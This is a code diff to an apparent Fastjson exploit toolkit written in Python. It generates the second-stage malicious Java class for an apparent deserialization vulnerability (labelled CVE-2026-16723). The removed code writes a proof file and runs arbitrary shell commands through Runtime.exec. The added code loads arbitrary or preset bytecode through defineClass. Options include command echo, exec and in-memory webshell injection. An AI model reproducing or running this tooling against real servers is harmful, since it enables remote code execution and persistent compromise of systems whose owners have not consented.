@@ -26,7 +26,6 @@ from pathlib import Path
 from typing import Any
 
 from fastjson_toolkit.poc.echo import ECHO_ENGINES as _SHARED_ECHO_ENGINES
-from fastjson_toolkit.poc.echo import build_echo_java_source
 from fastjson_toolkit.poc.memshell.auth import (
     format_memshell_connect_info,
     rand_token,
@@ -541,6 +540,28 @@ def probe_command_memshell(
         return -1, f"{type(e).__name__}: {e}"
 
 
+def build_defineclass_payload_src(
+    proof_path: str,
+    class_b64: str,
+    class_name: str,
+    *,
+    mode: str = "bytecode",
+    meta: dict[str, Any] | None = None,
+) -> str:
+    """生成 @JSONType wrapper：defineClass + newInstance 任意用户/预设字节码。"""
+    return build_memshell_payload_src(
+        proof_path=proof_path,
+        injector_b64=class_b64,
+        injector_class=class_name,
+        meta={
+            "mode": mode,
+            **(meta or {}),
+        },
+    ).replace("mode=memshell", f"mode={mode}").replace(
+        "mode=memshell-error", f"mode={mode}-error"
+    )
+
+
 def build_payload_src(
     proof_path: str,
     cmd: str | None,
@@ -548,12 +569,15 @@ def build_payload_src(
     cmd_header: str,
     echo_engine: str = "auto",
     memshell: dict[str, Any] | None = None,
+    class_b64: str | None = None,
+    class_name: str | None = None,
 ) -> str:
     """生成阶段二恶意类源码。
 
     memshell: 注入 MemShellParty injector
-    echo=False: <clinit> 写证明文件，可选执行写死的 --cmd
-    echo=True : 无参构造回显；spring / undertow / tomcat / auto
+    class_b64: 自备/预设字节码（custom）
+    echo=True : resolve echo-gen 后 JSONType defineClass 包装
+    echo=False: resolve touch/exec 后包装，或兼容旧 WriteFileJType
     """
     if memshell:
         return build_memshell_payload_src(
@@ -563,58 +587,64 @@ def build_payload_src(
             meta=memshell,
         )
 
-    proof_lit = _java_string_literal(proof_path)
+    from fastjson_toolkit.poc.bytecode import BytecodePresetOptions, resolve_bytecode_payload
+
+    if class_b64 and class_b64.strip():
+        art = resolve_bytecode_payload(
+            BytecodePresetOptions(
+                preset="custom",
+                class_b64=class_b64,
+                class_name=class_name or "CustomPayload",
+            )
+        )
+        if art is None:
+            raise RuntimeError("custom resolve 失败")
+        return build_defineclass_payload_src(
+            proof_path,
+            art.class_b64,
+            art.class_name or "CustomPayload",
+            mode="custom",
+        )
 
     if echo:
-        # 共用 poc.echo（jEG 多中间件 + JDK12+ Unsafe）；需 fastjson 仅因 @JSONType
-        return build_echo_java_source(
-            class_name="WriteFileJType",
-            engine=echo_engine,
-            cmd_header=cmd_header,
-            default_cmd="id",
-            proof_path=proof_path,
-            banner="CVE-2026-16723-FD-CACHE-PWNED",
-            extra_imports=["com.alibaba.fastjson.annotation.JSONType"],
-            class_annotations=["@JSONType"],
-            trigger_static=False,
+        art = resolve_bytecode_payload(
+            BytecodePresetOptions(
+                preset="echo",
+                engine=echo_engine or "auto",
+                cmd_header=cmd_header or "X-Cmd",
+                class_name="EchoPayload",
+            )
         )
-    cmd_block = ""
-    if cmd:
-        cmd_lit = _java_string_literal(cmd)
-        cmd_block = f"""
-            String cmd = "{cmd_lit}";
-            Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh", "-c", cmd}});
-            p.waitFor();
-            System.out.println("[WriteFileJType] exec done, exit=" + p.exitValue());
-"""
-    return f"""\
-import com.alibaba.fastjson.annotation.JSONType;
-import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
-import java.nio.file.Paths;
+        if art is None:
+            raise RuntimeError("echo resolve 失败")
+        return build_defineclass_payload_src(
+            proof_path,
+            art.class_b64,
+            art.class_name or "EchoPayload",
+            mode="echo",
+            meta={"engine": art.engine, "cmd_header": art.cmd_header},
+        )
 
-@JSONType
-public class WriteFileJType {{
-    static {{
-        try {{
-            String path = "{proof_lit}";
-            String body = "CVE-2026-16723-FD-CACHE-PWNED\\n"
-                    + "ts=" + System.currentTimeMillis() + "\\n"
-                    + "loader=" + WriteFileJType.class.getClassLoader() + "\\n"
-                    + "name=" + WriteFileJType.class.getName() + "\\n"
-                    + "cmd={_java_string_literal(cmd or "")}\\n";
-            Files.write(Paths.get(path), body.getBytes(StandardCharsets.UTF_8));
-            System.out.println("[WriteFileJType] wrote " + path);
-{cmd_block}
-        }} catch (Throwable t) {{
-            throw new RuntimeException(t);
-        }}
-    }}
-
-    public WriteFileJType() {{
-    }}
-}}
-"""
+    # touch / exec 预设
+    kind = "exec" if cmd else "touch"
+    art = resolve_bytecode_payload(
+        BytecodePresetOptions(
+            preset=kind,
+            cmd=cmd or "id",
+            proof_path=proof_path,
+            proof_content="CVE-2026-16723-FD-CACHE-PWNED",
+            class_name="PresetPayload",
+        )
+    )
+    if art is None:
+        raise RuntimeError(f"{kind} resolve 失败")
+    return build_defineclass_payload_src(
+        proof_path,
+        art.class_b64,
+        art.class_name or "PresetPayload",
+        mode=kind,
+        meta={"cmd": cmd or ""},
+    )
 
 
 class CountingHandler(http.server.BaseHTTPRequestHandler):
